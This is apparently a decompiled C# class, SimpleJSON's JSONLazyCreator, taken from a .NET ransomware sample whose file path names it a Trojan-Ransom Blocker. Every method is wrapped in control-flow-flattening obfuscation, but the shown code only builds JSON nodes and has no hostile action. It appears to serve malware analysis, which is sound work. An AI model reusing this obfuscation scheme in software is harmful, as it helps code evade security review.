// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONLazyCreator
// Assembly: ILegacyEvidenceAdapt, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 7C8AEC27-D027-41D5-B71C-E99019A8E594
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-a42b3919356aa815980faeac0fc6222bd4a2d6f6cc5bdc01c5a5f55014a9c66e.exe

namespace SimpleJSON
{
  internal class JSONLazyCreator : JSONNode
  {
    private JSONNode m_Node = (JSONNode) null;
    private string m_Key = (string) null;

    public JSONLazyCreator(JSONNode aNode)
    {
      this.m_Node = aNode;
      this.m_Key = (string) null;
    }

    public JSONLazyCreator(JSONNode aNode, string aKey)
    {
label_1:
      int num1 = -683572253;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1712202018)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1939593438 ^ 626460889;
            continue;
          case 3:
            num1 = (int) num2 * -22970688 ^ 220934059;
            continue;
          case 4:
            this.m_Node = aNode;
            num1 = (int) num2 * 766831715 ^ -1969463813;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      this.m_Key = aKey;
    }

    private void Set(JSONNode aVal)
    {
      bool flag = this.m_Key == null;
label_1:
      int num1 = 556948140;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1594049210)) % 10U)
        {
          case 0:
            this.m_Node = (JSONNode) null;
            num1 = 1109544849;
            continue;
          case 1:
            this.m_Node.Add(aVal);
            num1 = (int) num2 * -949803390 ^ -102053458;
            continue;
          case 2:
            num1 = (int) num2 * -1137995464 ^ -30716196;
            continue;
          case 3:
            goto label_3;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num2 * -840778088 ^ 1411000356;
            continue;
          case 6:
            int num3 = !flag ? 1014570315 : (num3 = 1512289645);
            num1 = num3 ^ (int) num2 * -820566633;
            continue;
          case 7:
            this.m_Node.Add(this.m_Key, aVal);
            num1 = 646986800;
            continue;
          case 8:
            num1 = (int) num2 * -875816306 ^ -1294008219;
            continue;
          case 9:
            num1 = (int) num2 * -1355288905 ^ 202118290;
            continue;
          default:
            goto label_12;
        }
      }
label_3:
      return;
label_12:;
    }

    public override JSONNode this[int aIndex]
    {
      get
      {
label_1:
        int num1 = 101826532;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1488097589)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this);
              num1 = (int) num2 * 2069142901 ^ 2126410698;
              continue;
            case 2:
              num1 = (int) num2 * 1843736100 ^ 751569846;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return jsonNode;
      }
      set
      {
        JSONArray aVal = new JSONArray();
label_1:
        int num1 = 1625590451;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 457676423)) % 5U)
          {
            case 0:
              goto label_3;
            case 1:
              aVal.Add(value);
              num1 = (int) num2 * -1827233520 ^ -70761937;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1070653403 ^ -372291880;
              continue;
            case 3:
              goto label_1;
            case 4:
              num1 = (int) num2 * -1408873736 ^ -1673450001;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public override JSONNode this[string aKey]
    {
      get
      {
        JSONNode jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this, aKey);
label_1:
        int num1 = 1217991281;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1183192753)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * -73200837 ^ -1059307917;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return jsonNode;
      }
      set
      {
label_1:
        int num1 = -490015154;
        JSONClass aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1347963821)) % 4U)
          {
            case 0:
              aVal.Add(aKey, value);
              num1 = (int) num2 * -1488027146 ^ -251673707;
              continue;
            case 1:
              aVal = new JSONClass();
              num1 = (int) num2 * -682567658 ^ 1195052281;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        this.Set((JSONNode) aVal);
      }
    }

    public override void Add(JSONNode aItem)
    {
label_1:
      int num1 = 1947129048;
      JSONArray aVal;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 652058447)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * -812664382 ^ 747021572;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * 662757827 ^ 1004228466;
            continue;
          case 4:
            aVal = new JSONArray();
            aVal.Add(aItem);
            num1 = (int) num2 * -2083249046 ^ -2140975670;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public override void Add(string aKey, JSONNode aItem)
    {
label_1:
      int num1 = -168787169;
      JSONClass aVal;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1829370635)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            aVal.Add(aKey, aItem);
            num1 = (int) num2 * -827618665 ^ 721381694;
            continue;
          case 2:
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * 1546687816 ^ 1592808855;
            continue;
          case 3:
            aVal = new JSONClass();
            num1 = (int) num2 * -1026077500 ^ -176279575;
            continue;
          case 4:
            goto label_3;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public static bool operator ==(JSONLazyCreator a, object b)
    {
label_1:
      int num1 = -1566381534;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -819042998)) % 7U)
        {
          case 0:
            flag1 = true;
            num1 = (int) num2 * -364001661 ^ -419774798;
            continue;
          case 1:
            flag2 = b == null;
            num1 = (int) num2 * -1621198355 ^ -889169723;
            continue;
          case 2:
            flag1 = (object) a == b;
            num1 = -10290150;
            continue;
          case 4:
            int num3 = flag2 ? 1445894765 : (num3 = 1780198781);
            num1 = num3 ^ (int) num2 * -1785774110;
            continue;
          case 5:
            goto label_1;
          case 6:
            num1 = (int) num2 * 471093955 ^ -233920269;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return flag1;
    }

    public static bool operator !=(JSONLazyCreator a, object b)
    {
label_1:
      int num1 = 91571419;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1757217250)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            flag = !(a == b);
            num1 = (int) num2 * -2054192712 ^ 1771852353;
            continue;
          case 3:
            num1 = (int) num2 * -2000576202 ^ -1808029010;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return flag;
    }

    public override bool Equals(object obj)
    {
      bool flag1 = obj == null;
label_1:
      int num1 = 723897723;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1731928056)) % 5U)
        {
          case 0:
            goto label_1;
          case 2:
            int num3 = !flag1 ? 813812985 : (num3 = 797600465);
            num1 = num3 ^ (int) num2 * 534186087;
            continue;
          case 3:
            flag2 = (object) this == obj;
            num1 = 8243417;
            continue;
          case 4:
            flag2 = true;
            num1 = (int) num2 * 924956504 ^ -2057590407;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return flag2;
    }

    public override int GetHashCode()
    {
      int hashCode = base.GetHashCode();
label_1:
      int num1 = -538668458;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -665590376)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * 1173462660 ^ 1827054070;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return hashCode;
    }

    public override string ToString()
    {
      string str = "";
label_1:
      int num1 = 235417670;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 438618106)) % 3U)
        {
          case 1:
            num1 = (int) num2 * -1820357589 ^ -1490759013;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    public override string ToString(string aPrefix)
    {
label_1:
      int num1 = 2082174608;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1532367237)) % 4U)
        {
          case 1:
            str = "";
            num1 = (int) num2 * -169294570 ^ 1699275220;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -1032185628 ^ -1758882131;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    public override int AsInt
    {
      get
      {
        JSONData aVal = new JSONData(0);
label_1:
        int num1 = -1519731369;
        int asInt;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1436993292)) % 5U)
          {
            case 0:
              goto label_1;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -234628836 ^ 1939534677;
              continue;
            case 3:
              num1 = (int) num2 * 921263025 ^ -2032981090;
              continue;
            case 4:
              asInt = 0;
              num1 = (int) num2 * -802118409 ^ -130693539;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        return asInt;
      }
      set
      {
label_1:
        int num1 = 224447500;
        JSONData aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1089388261)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              aVal = new JSONData(value);
              num1 = (int) num2 * 2053339173 ^ 1610993539;
              continue;
            case 2:
              goto label_3;
            case 3:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 1437883177 ^ -1218064868;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override float AsFloat
    {
      get
      {
label_1:
        int num1 = 1917314478;
        JSONData aVal;
        float asFloat;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1727703042)) % 5U)
          {
            case 1:
              this.Set((JSONNode) aVal);
              asFloat = 0.0f;
              num1 = (int) num2 * 1529704625 ^ -1050299376;
              continue;
            case 2:
              num1 = (int) num2 * -1074479162 ^ 1985127165;
              continue;
            case 3:
              aVal = new JSONData(0.0f);
              num1 = (int) num2 * -1102044712 ^ -1958935660;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_6:
        return asFloat;
      }
      set
      {
        JSONData aVal = new JSONData(value);
label_1:
        int num1 = 1500632612;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 367015538)) % 4U)
          {
            case 0:
              goto label_3;
            case 1:
              num1 = (int) num2 * -73786964 ^ 108965482;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1404229289 ^ -1590554051;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override double AsDouble
    {
      get
      {
label_1:
        int num1 = -1381335836;
        JSONData aVal;
        double asDouble;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1870809333)) % 7U)
          {
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 1160481344 ^ 918560251;
              continue;
            case 2:
              aVal = new JSONData(0.0);
              num1 = (int) num2 * -2016214700 ^ -203647308;
              continue;
            case 3:
              asDouble = 0.0;
              num1 = (int) num2 * -706360157 ^ -443779502;
              continue;
            case 4:
              num1 = (int) num2 * -720945949 ^ 938047129;
              continue;
            case 5:
              num1 = (int) num2 * -397658928 ^ 168273011;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_8:
        return asDouble;
      }
      set
      {
label_1:
        int num1 = 1768214169;
        JSONData aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 2073576846)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 1704174815 ^ 930715571;
              continue;
            case 2:
              goto label_3;
            case 3:
              aVal = new JSONData(value);
              num1 = (int) num2 * 468630520 ^ -1624544825;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override bool AsBool
    {
      get
      {
label_1:
        int num1 = -1391793219;
        bool asBool;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -647148279)) % 3U)
          {
            case 1:
              this.Set((JSONNode) new JSONData(false));
              asBool = false;
              num1 = (int) num2 * -2085306608 ^ 1423233357;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        return asBool;
      }
      set => this.Set((JSONNode) new JSONData(value));
    }

    public override JSONArray AsArray
    {
      get
      {
        JSONArray aVal = new JSONArray();
        this.Set((JSONNode) aVal);
        JSONArray asArray = aVal;
label_1:
        int num1 = -2054196269;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1424960725)) % 3U)
          {
            case 1:
              num1 = (int) num2 * 359280117 ^ 112549055;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        return asArray;
      }
    }

    public override JSONClass AsObject
    {
      get
      {
label_1:
        int num1 = -1739554048;
        JSONClass aVal;
        JSONClass asObject;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -293053695)) % 5U)
          {
            case 1:
              aVal = new JSONClass();
              num1 = (int) num2 * 800873858 ^ 234630869;
              continue;
            case 2:
              asObject = aVal;
              num1 = (int) num2 * -267784338 ^ -751123379;
              continue;
            case 3:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -399970107 ^ 1080523505;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_6:
        return asObject;
      }
    }
  }
}
